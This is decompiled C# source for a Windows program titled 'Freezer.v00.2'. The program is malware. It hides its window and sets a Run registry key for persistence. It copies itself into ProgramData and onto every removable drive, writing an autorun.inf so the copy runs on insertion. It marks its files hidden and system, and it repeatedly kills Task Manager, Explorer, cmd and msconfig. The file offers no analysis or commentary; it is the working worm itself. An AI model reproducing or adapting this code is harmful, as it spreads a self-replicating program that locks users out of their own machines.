using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Freezer_v0._2.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace Freezer_v0._2;

[DesignerGenerated]
public class Fery1 : Form
{
	private IContainer components;

	public Fery1()
	{
		((Form)this).add_Load((EventHandler)Fery1_Load);
		InitializeComponent();
	}

	private void Fery1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		string text = Interaction.Environ("homedrive") + "\\programdata\\Fery1Freezer.exe";
		object? objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Wscript.Shell", ""));
		object[] obj = new object[2] { "HKCU\\software\\microsoft\\windows\\currentversion\\run\\Fery1Freezer", text };
		object[] array = obj;
		bool[] obj2 = new bool[2] { false, true };
		bool[] array2 = obj2;
		NewLateBinding.LateCall(objectValue, (Type)null, "regwrite", obj, (string[])null, (Type[])null, obj2, true);
		if (array2[1])
		{
			text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(string));
		}
		Fery1Freezer();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Fery1Freezer()
	{
		int try0000_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		string text = default(string);
		string executablePath = default(string);
		IEnumerator<DriveInfo> enumerator = default(IEnumerator<DriveInfo>);
		DriveInfo current = default(DriveInfo);
		Process[] processes = default(Process[]);
		int num5 = default(int);
		Process process = default(Process);
		string text2 = default(string);
		string text3 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					num = 1;
					((Control)this).Hide();
					goto IL_0008;
				case 536:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_001f;
						case 6:
							goto IL_0031;
						case 7:
							goto IL_003a;
						case 8:
							goto IL_0060;
						case 9:
							goto IL_006c;
						case 10:
							goto IL_0078;
						case 11:
							goto IL_008e;
						case 12:
							goto IL_009f;
						case 13:
							goto IL_00ab;
						case 14:
							goto IL_00ba;
						case 15:
							goto IL_00c9;
						case 16:
							goto IL_00d3;
						case 17:
							goto IL_00de;
						case 18:
							goto IL_00e9;
						case 19:
							goto IL_00f8;
						case 20:
							goto IL_0106;
						case 21:
							goto IL_011c;
						case 22:
							goto IL_0178;
						case 23:
							goto IL_0182;
						case 4:
						case 5:
						case 24:
							goto IL_0193;
						default:
							goto end_IL_0000;
						case 25:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_00c9:
					num = 15;
					streamWriter.Close();
					goto IL_00d3;
					IL_0008:
					num = 2;
					text = Interaction.Environ("homedrive") + "\\programdata\\Fery1Freezer.exe";
					goto IL_001f;
					IL_001f:
					num = 3;
					FileSystem.FileCopy(Application.get_ExecutablePath(), text);
					goto IL_0193;
					IL_0193:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0031;
					IL_0031:
					num = 6;
					executablePath = Application.get_ExecutablePath();
					goto IL_003a;
					IL_003a:
					num = 7;
					enumerator = ((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives().GetEnumerator();
					goto IL_00ec;
					IL_00ec:
					if (enumerator.MoveNext())
					{
						current = enumerator.Current;
						goto IL_0060;
					}
					goto IL_00f8;
					IL_00f8:
					num = 19;
					enumerator?.Dispose();
					goto IL_0106;
					IL_00de:
					num = 17;
					FileSystem.SetAttr(executablePath, (FileAttribute)7);
					goto IL_00e9;
					IL_0106:
					num = 20;
					processes = Process.GetProcesses();
					num5 = 0;
					goto IL_018b;
					IL_018b:
					if (num5 < processes.Length)
					{
						process = processes[num5];
						goto IL_011c;
					}
					goto IL_0193;
					IL_00e9:
					num = 18;
					goto IL_00ec;
					IL_011c:
					num = 21;
					if ((Operators.CompareString(process.ProcessName, "taskmgr", false) == 0) | (Operators.CompareString(process.ProcessName, "explorer", false) == 0) | (Operators.CompareString(process.ProcessName, "cmd", false) == 0) | (Operators.CompareString(process.ProcessName, "msconfig", false) == 0))
					{
						goto IL_0178;
					}
					goto IL_0182;
					IL_0178:
					num = 22;
					process.Kill();
					goto IL_0182;
					IL_0182:
					num = 23;
					num5 = checked(num5 + 1);
					goto IL_018b;
					IL_00d3:
					num = 16;
					FileSystem.SetAttr(text2, (FileAttribute)7);
					goto IL_00de;
					IL_0060:
					num = 8;
					if (current.DriveType == DriveType.Removable)
					{
						goto IL_006c;
					}
					goto IL_00e9;
					IL_006c:
					num = 9;
					text3 = current.ToString();
					goto IL_0078;
					IL_0078:
					num = 10;
					FileSystem.FileCopy(executablePath, text3 + "Fery1Freezer.exe");
					goto IL_008e;
					IL_008e:
					num = 11;
					text2 = text3 + "autorun.inf";
					goto IL_009f;
					IL_009f:
					num = 12;
					streamWriter = new StreamWriter(text2);
					goto IL_00ab;
					IL_00ab:
					num = 13;
					streamWriter.WriteLine("[autorun]");
					goto IL_00ba;
					IL_00ba:
					num = 14;
					streamWriter.WriteLine("shellexecute=Fery1Freezer.exe");
					goto IL_00c9;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 536;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(211, 40));
		((Control)this).set_Name("Fery1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Freezer.v00.2");
		((Control)this).ResumeLayout(false);
	}
}
